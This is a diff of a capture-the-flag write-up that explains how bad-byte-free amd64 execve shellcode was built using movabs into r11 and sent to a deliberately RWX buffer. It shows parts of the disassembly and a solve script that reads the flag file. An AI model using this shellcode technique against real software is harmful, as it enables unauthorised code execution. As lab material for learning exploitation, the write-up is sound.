@@ -82,16 +82,16 @@ Yes! We just need to send the program some shellcode to execute.
 ## Strategy
 
 We attempted to use the shellcraft module to generate the shellcode, just as in
-[level-0][level]. There is an encoding functionality such that we could specify
-that `\x48` is a bad byte and should be avoided. Unfortunately, we were unable
-to create shellcode this way. The module simply reported that it was not
-possible with its current functionality. Compiling bits of assmembly and taking
-a look at the opcodes for amd64, we found that the `\x48` byte was generally
-created when we tried to use the `mov` instruction into one of the base amd64
-registers. We learned that we could avoid the `\x48` byte by using the `movabs`
-instruction into one of the amd64 extended registers (ie, `$r11`). We thus used
-the following shellcode, inspired by a [blog post][blog] we found that was
-attempting to create really short shellcode.
+[level-0][level]. There is an [encoding][encoders] functionality such that we
+could specify that `\x48` is a bad byte and should be avoided. Unfortunately,
+we were unable to create shellcode this way. The module simply reported that it
+was not possible with its current functionality. Compiling bits of assmembly and
+taking a look at the opcodes for amd64, we found that the `\x48` byte was
+generally created when we tried to use the `mov` instruction into one of the
+base amd64 registers. We learned that we could avoid the `\x48` byte by using
+the `movabs` instruction into one of the amd64 extended registers (ie, `$r11`).
+We thus used the following shellcode, inspired by a [blog post][blog] we found
+that was attempting to create really short shellcode.
 
 ```asm
 0:   31 f6                   xor    esi,esi                 /* zero out register */
@@ -106,7 +106,8 @@ f:   54                      push   rsp                     /* memory location o
 18:   0f 05                  syscall                        /* call our execve */
 ```
 
-We added this to our solution and created the byte string needed to send to the program:
+We added this to our solution and created the byte string needed to send to the
+program:
 
 ```python
 shellcode = """
@@ -135,7 +136,7 @@ io.sendline('cat flag.txt')
 flag = io.recv()
 ```
 
-## The Solution (with a caveat)
+## The Solution
 
 You should be able to run the script like so and get the flag!
 
@@ -147,7 +148,9 @@ $ python3 ./solve.py
 
 ## Mitigations
 
-I won't even discuss exploitation mitigations since the develops purposefully made `buf` RWX. :)
+I won't even discuss exploitation mitigations since the develops purposefully
+made `buf` RWX. :)
 
+[encoders]: https://docs.pwntools.com/en/stable/encoders.html
 [level]: /random-pwnables/level-0/README.md
 [blog]: https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
